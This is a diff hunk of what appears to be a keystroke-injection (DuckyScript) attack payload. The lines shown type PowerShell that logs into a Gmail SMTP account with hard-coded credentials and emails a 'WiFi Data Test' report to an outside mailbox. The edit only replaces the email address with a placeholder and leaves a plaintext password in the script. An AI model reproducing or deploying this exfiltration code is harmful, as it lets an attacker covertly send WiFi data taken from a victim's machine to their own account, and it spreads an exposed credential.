@@ -45,13 +45,13 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jpphee@googlemail.com', 'G00gle13$')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nobody@googlemail.com', 'G00gle13$')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'jpphee@googlemail.com'
+STRING $ReportEmail.From = 'nobody@googlemail.com'
 ENTER
-STRING $ReportEmail.To.Add('jpphee@googlemail.com')
+STRING $ReportEmail.To.Add('nobody@googlemail.com')
 ENTER
 STRING $ReportEmail.Subject = 'WiFi Data Test'
 ENTER
